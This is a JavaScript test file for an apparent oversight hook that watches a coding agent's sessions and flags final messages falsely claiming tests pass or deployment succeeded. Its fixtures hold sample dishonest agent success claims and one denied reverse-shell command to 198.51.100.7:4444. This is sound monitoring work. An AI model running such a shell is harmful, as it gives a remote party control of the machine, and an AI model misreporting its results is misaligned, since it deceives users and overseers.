// Lifecycle hooks: Stop, SubagentStop, PreCompact (and PostToolUseFailure, which carries the outcome of
// every failed Bash / PowerShell / MCP call — PostToolUse only fires for calls that completed).
// Visibility-only: nothing here ever blocks a stop or a compaction, and nothing is printed on a channel
// that feeds the model.
//   node --test --import ./test/hermetic-env.mjs test/lifecycle.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startConsole, sandbox, runHook, ledger, rawLedger, settle, HOOK } from "./lifecycle-harness.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const POLICY = { captureTier: "content-free", threatPolicy: {} };
const CLAIM = "Agent reported success but tool calls failed";
const SUMMARY = "Agent session summary";
const prompt = (session = "sess-lc") => ({ hook_event_name: "UserPromptSubmit", session_id: session, prompt: "make the tests pass" });
const failBash = (command, error, extra = {}) => ({ hook_event_name: "PostToolUseFailure", tool_name: "Bash", tool_use_id: `toolu_${Math.random().toString(36).slice(2)}`, tool_input: { command }, error, is_interrupt: false, ...extra });
const okBash = (command, stdout = "ok\n", extra = {}) => ({ hook_event_name: "PostToolUse", tool_name: "Bash", tool_use_id: `toolu_${Math.random().toString(36).slice(2)}`, tool_input: { command }, tool_response: { stdout, stderr: "", interrupted: false, isImage: false }, ...extra });
const stop = (msg, extra = {}) => ({ hook_event_name: "Stop", stop_hook_active: false, last_assistant_message: msg, background_tasks: [], session_crons: [], ...extra });

async function session(steps, { enrolled = true } = {}) {
  const c = await startConsole(POLICY);
  const sb = sandbox({ port: c.port, enrolled, tag: "life" });
  const outs = [];
  for (const s of steps) outs.push(await runHook(sb, s));
  await settle();
  await c.close();
  return { sb, outs, alerts: c.alerts };
}

// ---- registration ----

function withHome(fn) {
  const home = mkdtempSync(join(tmpdir(), "moorai-life-reg-"));
  try { return fn(home); } finally { rmTree(home); }
}
const settingsOf = (home) => JSON.parse(readFileSync(join(home, ".claude", "settings.json"), "utf8"));
const ours = (entries) => (entries || []).filter((e) => JSON.stringify(e).includes("moorai-hook")).map((e) => e.matcher).sort();

test("install registers Stop, SubagentStop, PreCompact and PostToolUseFailure; uninstall removes them all", () => withHome((home) => {
  const env = { ...process.env, HOME: home, USERPROFILE: home };
  assert.equal(spawnSync("node", [HOOK, "install"], { env, encoding: "utf8" }).status, 0);
  const h = settingsOf(home).hooks;
  assert.deepEqual(ours(h.Stop), [""]);
  assert.deepEqual(ours(h.SubagentStop), [""]);
  assert.deepEqual(ours(h.PreCompact), [""]);
  assert.deepEqual(ours(h.PostToolUseFailure), ["Bash", "PowerShell", "mcp__.*"]);
  assert.equal(spawnSync("node", [HOOK, "uninstall"], { env, encoding: "utf8" }).status, 0);
  const after = settingsOf(home).hooks;
  for (const e of ["Stop", "SubagentStop", "PreCompact", "PostToolUseFailure", "PreToolUse"]) assert.deepEqual(ours(after[e]), [], e);
}));

test("converge: a device installed before these events gains them on its next ordinary hook run", () => withHome((home) => {
  mkdirSync(join(home, ".claude"), { recursive: true });
  mkdirSync(join(home, ".moorai"), { recursive: true });
  writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify({ serverUrl: "http://127.0.0.1:1", tenant: "acme" }));
  const entry = (m) => ({ matcher: m, hooks: [{ type: "command", command: `node ${JSON.stringify(HOOK)}` }] });
  writeFileSync(join(home, ".claude", "settings.json"), JSON.stringify({ hooks: { PreToolUse: [entry("Read"), entry("Bash")], Stop: [{ matcher: "", hooks: [{ type: "command", command: "echo mine" }] }] } }));
  const r = spawnSync("node", [HOOK], { env: { ...process.env, HOME: home, USERPROFILE: home }, input: JSON.stringify({ hook_event_name: "PreToolUse", session_id: "s", tool_name: "Glob", tool_input: {} }), encoding: "utf8" });
  assert.equal(r.status, 0, r.stderr);
  const h = settingsOf(home).hooks;
  assert.deepEqual(ours(h.Stop), [""]);
  assert.ok(h.Stop.some((e) => JSON.stringify(e).includes("echo mine")), "the user's own Stop hook must survive");
  assert.deepEqual(ours(h.PreCompact), [""]);
  assert.deepEqual(ours(h.PostToolUseFailure), ["Bash", "PowerShell", "mcp__.*"]);
}));

// ---- outcomes ----

test("outcomes are recorded content-free: a failure's exit code, an interrupt, an MCP error, an empty success", async () => {
  const { sb } = await session([
    prompt(),
    failBash("npm test -- --grep SECRETWORD", "Exit code 1\nFAIL src/a.test.js SECRETWORD"),
    failBash("pytest -x", "Command timed out after 2m 0s"),
    { hook_event_name: "PostToolUseFailure", tool_name: "mcp__github__create_pull_request", tool_use_id: "toolu_m", tool_input: { title: "SECRETWORD" }, error: "Validation Failed" },
    okBash("true", "")
  ]);
  const rows = ledger(sb).filter((r) => r.ev === "fail" || r.ev === "post");
  assert.deepEqual(rows.map((r) => [r.ev, r.tool, r.outcome, r.exit ?? null, r.cls ?? null]), [
    ["fail", "Bash", "error", 1, "verify"],
    ["fail", "Bash", "interrupted", null, "verify"],
    ["fail", "mcp__github__create_pull_request", "error", null, null],
    ["post", "Bash", "ok", null, "other"]
  ]);
  assert.ok(!rawLedger(sb).includes("SECRETWORD") && !rawLedger(sb).includes("npm test"), "no command, error text or argument may reach the ledger");
});

// ---- Stop: claimed success vs reality ----

test("Stop: 'all tests pass' after a failed test run is a content-free CLAIM_MISMATCH alert; nothing reaches the model", async () => {
  const msg = "All tests pass now and the build is green.";
  const { outs, alerts, sb } = await session([prompt(), okBash("git status"), failBash("npm test", "Exit code 1\n2 failing"), stop(msg)]);
  const st = outs.at(-1);
  assert.equal(st.code, 0);
  assert.equal(st.out, "", "an enrolled device prints nothing at Stop: no block, no additionalContext");
  const a = alerts.find((x) => x.category === CLAIM);
  assert.ok(a, `no claim alert: ${JSON.stringify(alerts.map((x) => x.category))}`);
  assert.deepEqual([a.reasonCode, a.enforcement, a.stage, a.tool], ["CLAIM_MISMATCH", "AS_CONFIGURED", "lifecycle", "hook:Stop"]);
  assert.deepEqual(a.claimCheck, { claim: "tests-pass", lastOutcome: "error", calls: 2, failed: 1, denied: 0, interrupted: 0, unresolved: 1, scope: "turn" });
  const blob = JSON.stringify(alerts) + rawLedger(sb);
  assert.ok(!blob.includes("green") && !blob.includes("All tests"), "the final message must never be stored or sent");
});

test("Stop: an honest message, or a failure redone green, raises no claim alert", async () => {
  const honest = await session([prompt(), failBash("npm test", "Exit code 1"), stop("I couldn't get the tests to pass; 2 still fail in parser.test.js.")]);
  assert.ok(!honest.alerts.some((x) => x.category === CLAIM));
  const stopRow = (r) => ledger(r.sb).find((x) => x.ev === "stop");
  assert.equal(stopRow(honest).claimFlag, false, "the check ran (a missing row would make this test vacuous)");
  const redone = await session([prompt(), failBash("npm test", "Exit code 1"), okBash("npm test", "12 passing\n"), stop("All tests pass now.")]);
  assert.ok(!redone.alerts.some((x) => x.category === CLAIM));
  assert.deepEqual([stopRow(redone).claim, stopRow(redone).claimFlag], ["tests-pass", false], "the claim was seen, and the green re-run resolved the failure");
  const probe = await session([prompt(), failBash("grep -r TODO src", "Exit code 1"), okBash("npm test", "12 passing\n"), stop("Done. All tests pass.")]);
  assert.ok(!probe.alerts.some((x) => x.category === CLAIM), "grep's exit 1 is 'no match', not a failure");
  assert.equal(stopRow(probe).claimFlag, false);
  assert.ok(stopRow(probe).claim);
});

test("Stop: a call MoorAI denied this turn counts against a success claim", async () => {
  const { alerts } = await session([prompt(), { hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "toolu_d", tool_input: { command: "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1" } }, stop("Deployed successfully.")]);
  const a = alerts.find((x) => x.category === CLAIM);
  assert.ok(a);
  assert.equal(a.claimCheck.denied, 1);
});

test("Stop: only the current turn counts — a failure before the last user prompt does not", async () => {
  const { alerts, sb } = await session([prompt(), failBash("npm test", "Exit code 1"), stop("I couldn't fix it."), prompt(), okBash("ls"), stop("Done.")]);
  assert.ok(!alerts.some((x) => x.category === CLAIM));
  const last = ledger(sb).filter((x) => x.ev === "stop").at(-1);
  assert.deepEqual([last.claim, last.claimFlag], ["done", false], "the claim was seen; the earlier turn's failure was out of scope");
});

test("Stop: the session summary is content-free counts, posted once per change", async () => {
  const { alerts, sb } = await session([prompt(), okBash("ls"), failBash("make", "Exit code 2"), stop("Here is what I found."), stop("Here is what I found.")]);
  const s = alerts.filter((x) => x.category === SUMMARY);
  assert.equal(s.length, 1, "an unchanged summary is not re-posted");
  assert.deepEqual([s[0].reasonCode, s[0].enforcement, s[0].riskLevel], ["SESSION_SUMMARY", "AS_CONFIGURED", "Info"]);
  assert.equal(s[0].summary.failed, 1);
  assert.equal(s[0].summary.outcomes, 2);
  assert.equal(s[0].summary.prompts, 1);
  assert.ok(ledger(sb).some((r) => r.ev === "stop"));
});

test("Stop: an unenrolled device coaches the user with a systemMessage only — never decision/additionalContext", async () => {
  const { outs } = await session([prompt(), failBash("npm test", "Exit code 1"), stop("All tests pass now.")], { enrolled: false });
  const j = outs.at(-1).json;
  assert.ok(j && typeof j.systemMessage === "string" && /reported success/.test(j.systemMessage), outs.at(-1).out);
  assert.deepEqual(Object.keys(j), ["systemMessage"]);
});

// ---- SubagentStop ----

test("SubagentStop: judged on the subagent's own outcomes only", async () => {
  const sub = { agent_id: "agent-7", agent_type: "general-purpose" };
  const { alerts } = await session([
    prompt(),
    failBash("cargo build", "Exit code 101"),                  // the MAIN agent's failure
    okBash("cargo test", "ok\n", sub),                         // the subagent's own call succeeded
    { hook_event_name: "SubagentStop", stop_hook_active: false, ...sub, agent_transcript_path: "/tmp/a.jsonl", last_assistant_message: "Fixed it; all tests pass." }
  ]);
  assert.ok(!alerts.some((x) => x.category === CLAIM), "the parent's failure must not be pinned on the subagent");
  const bad = await session([
    prompt(),
    failBash("cargo test", "Exit code 101", sub),
    { hook_event_name: "SubagentStop", stop_hook_active: false, ...sub, agent_transcript_path: "/tmp/a.jsonl", last_assistant_message: "Fixed it; all tests pass." }
  ]);
  const a = bad.alerts.find((x) => x.category === CLAIM);
  assert.ok(a);
  assert.deepEqual([a.tool, a.claimCheck.scope], ["hook:SubagentStop", "subagent"]);
});

// ---- PreCompact ----

test("PreCompact: recorded content-free, never blocks, and counted in the summary", async () => {
  const { outs, sb, alerts } = await session([prompt(), { hook_event_name: "PreCompact", trigger: "manual", custom_instructions: "SECRETWORD keep the plan" }, stop("Here is the plan.")]);
  assert.equal(outs[1].code, 0);
  assert.equal(outs[1].out, "");
  const row = ledger(sb).find((r) => r.ev === "compact");
  assert.deepEqual([row.trigger, row.reasonCode, row.enforcement], ["manual", "OBSERVATION_ONLY", "UNEVALUATED"]);
  assert.ok(!rawLedger(sb).includes("SECRETWORD"));
  assert.equal(alerts.find((x) => x.category === SUMMARY).summary.compactions, 1);
});
